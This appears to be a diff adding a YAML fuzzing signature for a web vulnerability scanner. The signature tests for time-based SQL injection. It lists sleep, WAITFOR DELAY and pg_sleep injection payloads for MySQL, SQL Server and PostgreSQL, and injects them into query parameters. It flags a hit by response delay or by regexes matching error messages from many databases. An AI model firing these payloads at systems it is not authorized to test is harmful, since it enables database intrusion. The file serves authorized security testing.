@@ -1,0 +1,131 @@
+# info to search signature
+id: time-based-sqli
+type: fuzz
+info:
+  name: Time Based SQLi
+  risk: High
+
+# origin: gonna come from Burp
+payloads:
+- \'XOR(if(now()=sysdate(),sleep(5*1),0))OR\'
+- if(now()=sysdate(),sleep(5),0)
+- (select(0)from(select(sleep(5)))v)/*\'+(select(3)from(select(sleep(5)))v)+\'\"+(select(0)from(select(sleep(5)))v)+\"*/
+- \'XOR(if(now()=sysdate(),sleep(5*1),0))XOR\'Z
+- 1 AND (SELECT * FROM (SELECT(SLEEP(5)))YYYY) AND \'\%\'=\'
+- 1\'XOR(if(now()=sysdate(),sleep(5),0))OR\'
+- 1 AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY)-- 1337
+- 1 or sleep(5)#
+- \' WAITFOR%20DELAY \'0:0:5\'--
+- \%\';SELECT PG_SLEEP(5)--
+- pg_sleep(5)
+- \'| |pg_sleep(5)--
+
+requests:
+  - redirect: false
+    headers:
+      - User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0
+
+    generators:
+      # Change exist content type or adding new one
+      - Query("{{.payload}}")
+    detections:
+    
+      - >-
+        ResponseTime() > 5 && ResponseTime() < 6
+        
+      # Cache
+      - >-
+        RegexSearch("resBody", "encountered after end of query|A comparison operator is required here")
+      
+      # CrateDB
+      - >-
+        RegexSearch("resBody", "io\.crate\.client\.jdbc")
+      
+      # MimerSQL
+      - >-
+        RegexSearch("resBody", "com\.mimer\.jdbc|Syntax error,[^\n]+assumed to mean")
+      
+      # Altibase
+      - >-
+        RegexSearch("resBody", "Altibase\.jdbc\.driver")
+      
+      # Presto
+      - >-
+        RegexSearch("resBody", "com\.facebook\.presto\.jdbc|io\.prestosql\.jdbc|com\.simba\.presto\.jdbc|UNION query has different number of fields: [0-9]+, [0-9]+")
+      
+      # Mckoi
+      - >-
+        RegexSearch("resBody", "com\.mckoi\.JDBCDriver|com\.mckoi\.database\.jdbc|&lt;REGEX_LITERAL&gt;")
+      
+      # Vertica
+      - >-
+        RegexSearch("resBody", ", Sqlstate: (3F|42).{3}, (Routine|Hint|Position):|/vertica/Parser/scan|com\.vertica\.jdbc|org\.jkiss\.dbeaver\.ext\.vertica|com\.vertica\.dsi\.dataengine")
+      
+      # Apache Derby
+      - >-
+        RegexSearch("resBody", "Syntax error: Encountered|org\.apache\.derby|ERROR 42X01")
+      
+      # MonetDB
+      - >-
+        RegexSearch("resBody", "![0-9]{5}![^\\n]+(failed|unexpected|error|syntax|expected|violation|exception)|\\[MonetDB\\]\\[ODBC Driver|nl\.cwi\.monetdb\.jdbc")
+      
+      # H2
+      - >-
+        RegexSearch("resBody", "org\.h2\.jdbc")
+      
+      # HSQLDB
+      - >-
+        RegexSearch("resBody", "Unexpected end of command in statement \\[|Unexpected token.*?in statement \\[|org\.hsqldb\.jdbc")
+      
+      # FrontBase
+      - >-
+        RegexSearch("resBody", "Exception (condition )?[0-9]+\. Transaction rollback|com\.frontbase\.jdbc|Syntax error 1. Missing|(Semantic|Syntax) error [1-4][0-9]{2}\.")
+      
+      # Ingres
+      - >-
+        RegexSearch("resBody", "Warning.*?\Wingres_|Ingres SQLSTATE|Ingres\W.*?Driver|com\.ingres\.gcf\.jdbc")
+      
+      # Sybase
+      - >-
+        RegexSearch("resBody", "Warning.*?\Wsybase_|Sybase message|Sybase.*?Server message|SybSQLException|Sybase\.Data\.AseClient|com\.sybase\.jdbc")
+      
+      # SAP MaxDB
+      - >-
+        RegexSearch("resBody", "SQL error.*?POS([0-9]+)|Warning.*?\Wmaxdb_|DriverSapDB|-3014.*?Invalid end of SQL statement|com\.sap\.dbtech\.jdbc|\[-3008\].*?: Invalid keyword or missing delimiter")
+      
+      # SQLite
+      - >-
+        RegexSearch("resBody", "SQLite/JDBCDriver|SQLite\.Exception|(Microsoft|System)\.Data\.SQLite\.SQLiteException|Warning.*?\W(sqlite_|SQLite3::)|SQLite error [0-9]{1,}:|sqlite3.OperationalError:|SQLite3::SQLException|org\.sqlite\.JDBC|SQLiteException")
+      
+      # Firebird
+      - >-
+        RegexSearch("resBody", "Dynamic SQL Error|Warning.*?\Wibase_|org\.firebirdsql\.jdbc")
+      
+      # Informix
+      - >-
+        RegexSearch("resBody", "Warning.*?\Wifx_|Exception.*?Informix|Informix ODBC Driver|ODBC Informix driver|com\.informix\.jdbc|weblogic\.jdbc\.informix|IfxException")
+      
+      # IBM DB2
+      - >-
+        RegexSearch("resBody", "CLI Driver.*?DB2|DB2 SQL error|db2_\w+\\(|SQLCODE[=:\d, -]+SQLSTATE|com\.ibm\.db2\.jcc|Zend_Db_(Adapter|Statement)_Db2_Exception|DB2Exception|ibm_db_dbi\.ProgrammingError")
+      
+      # Oracle
+      - >-
+        RegexSearch("resBody", "\bORA-\d{5}|Oracle error|Oracle.*?Driver|Warning.*?\W(oci|ora)_|quoted string not properly terminated|SQL command not properly ended|macromedia\.jdbc\.oracle|oracle\.jdbc|Zend_Db_(Adapter|Statement)_Oracle_Exception|OracleException")
+      
+      # Microsoft Access
+      - >-
+        RegexSearch("resBody", "Microsoft Access ([0-9]+ )?Driver|JET Database Engine|Access Database Engine|ODBC Microsoft Access|Syntax error \(missing operator\) in query expression")
+      
+      # Microsoft SQL Server
+      - >-
+        RegexSearch("resBody", "Driver.*? SQL[\-\_\ ]*Server|OLE DB.*? SQL Server|\bSQL Server[^&lt;&quot;]+Driver|Warning.*?\W(mssql|sqlsrv)_|\bSQL Server[^&lt;&quot;]+[0-9a-fA-F]{8}|System\.Data\.SqlClient\.SqlException|(?s)Exception.*?\bRoadhouse\.Cms\.|Microsoft SQL Native Client error '[0-9a-fA-F]{8}|ODBC SQL Server Driver|ODBC Driver \d+ for SQL Server|SQLServer JDBC Driver|com\.jnetdirect\.jsql|macromedia\.jdbc\.sqlserver|Zend_Db_(Adapter|Statement)_Sqlsrv_Exception|com\.microsoft\.sqlserver\.jdbc|SQL(Srv|Server)Exception")
+      
+      # MySql
+      - >-
+        RegexSearch("resBody", "check the manual that (corresponds to|fits) your MySQL server version|SQL syntax.*?MySQL|Warning.*?\Wmysqli?_|MySQLSyntaxErrorException|valid MySQL result|check the manual that (corresponds to|fits) your MariaDB server version\" fork=\"MariaDB|check the manual that (corresponds to|fits) your Drizzle server version\" fork=\"Drizzle|Unknown column '[^ ]+' in 'field list'|MySqlClient\.|com\.mysql\.jdbc|Zend_Db_(Adapter|Statement)_Mysqli_Exception|MySqlException|SQLSTATE\[\d+\]: Syntax error or access violation|MemSQL does not support this type of query\" fork=\"MemSQL|is not supported by MemSQL\" fork=\"MemSQL|unsupported nested scalar subselect\" fork=\"MemSQL")
+        
+      
+      # PostgreSQL
+      - >-
+        RegexSearch("resBody", "PostgreSQL.*?ERROR|Warning.*?\Wpg_|valid PostgreSQL result|Npgsql\.|PG::SyntaxError:|org\.postgresql\.util\.PSQLException|ERROR:\s\ssyntax error at or near|ERROR: parser: parse error at or near|PostgreSQL query failed|org\.postgresql\.jdbc|PSQLException")
